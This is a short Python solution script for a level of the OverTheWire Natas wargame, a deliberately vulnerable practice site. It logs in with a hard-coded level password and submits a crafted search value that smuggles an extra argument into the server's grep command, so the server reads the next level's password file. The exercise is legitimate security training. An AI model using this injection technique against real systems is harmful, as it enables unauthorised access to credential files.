import requests
import re
import binascii
import base64

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username

#custom_cookies = {"loggedin":"1"}


session = requests.Session()


#secret = base64.b64decode(binascii.unhexlify("3d3d516343746d4d6d6c315669563362")[::-1]).decode()#make it binary, reverse it decode it from base64 then .decode() to get it as a string.

response = session.post(url,data={"needle":". /etc/natas_webpass/natas11 #", "submit":"submit"}, auth = (username, password))

content = response.text

#print(content)

print(re.findall('<pre>\n(.*)\n', content)[0])
